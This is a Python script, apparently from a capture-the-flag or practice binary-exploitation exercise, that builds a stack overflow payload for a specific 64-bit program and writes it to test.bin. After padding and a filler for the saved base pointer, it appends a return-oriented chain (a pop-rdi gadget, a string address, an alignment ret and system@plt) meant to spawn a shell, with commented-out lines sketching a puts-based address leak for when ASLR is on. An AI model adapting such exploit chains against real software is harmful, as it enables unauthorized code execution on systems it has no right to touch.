import struct
# ACTUAL PAYLOAD
payload = b""

text_64 = b"\x00" * 64
b_70 = b"\x00" * 70
padding = b"\x00" * 10

payload += text_64
payload += b_70
payload += padding

print(len(payload))

# garbage rbp. Q = unsigned long long 8 bytes
# 0xffffcd30
payload += b"\x00" * 8

# garbage entered-----------------------------

"""
    BUILD TESTING
"""
#  0x5555555554fb
# testprint = 0x7ffff7e4f450
# payload += struct.pack("Q", testprint)

## NO ASLR
poprdi = 0x4013b3
payload += struct.pack("Q", poprdi)
# # test_rip = 0x7ffff7e1d2c0
sh = 0x404050
payload += struct.pack("Q", sh)
padret = 0x40101a
ret = struct.pack("Q", padret)
payload += ret
system = 0x401090
payload += struct.pack("Q", system)
# exitt = 0x7ffff7e11a70
# payload += struct.pack("Q", exitt)





### ASLR ON
puts_plt = 0x401080
# payload += struct.pack("Q", system)
puts_GOT = 0x404018
# payload += struct.pack("Q", system)
poprdi = 0x4013b3


main_plt = 0x4011b6
# payload += struct.pack("Q", poprdi)
# payload += struct.pack("Q", puts_GOT)
# payload += struct.pack("Q", puts_plt)
# payload += struct.pack("Q", main_plt)




# payload += b"t"

payload = payload[:-1]
payload += b"\n"

print(len(payload))
print(payload)
f = open("test.bin", "wb")
f.write(payload)
# f.write(payload)
# f.write(b"ls\n")
f.close()
